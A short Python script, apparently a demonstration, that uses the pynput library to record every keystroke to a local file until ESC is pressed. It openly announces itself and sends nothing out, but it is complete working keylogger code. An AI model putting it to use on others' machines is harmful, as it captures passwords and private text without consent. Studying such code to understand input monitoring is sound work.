from pynput import keyboard

# File to save logged keys
LOG_FILE = "keylog.txt"

def on_press(key):
    try:
        # Try to get the alphanumeric character
        with open(LOG_FILE, "a") as f:
            f.write(key.char)
    except AttributeError:
        # Handle special keys (e.g., enter, shift, space)
        with open(LOG_FILE, "a") as f:
            f.write(f'[{key.name}]')

def on_release(key):
    # Stop listener if ESC is pressed
    if key == keyboard.Key.esc:
        print("🛑 Logging stopped.")
        return False

def main():
    print("🔒 Keylogger started (Press ESC to stop)...")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
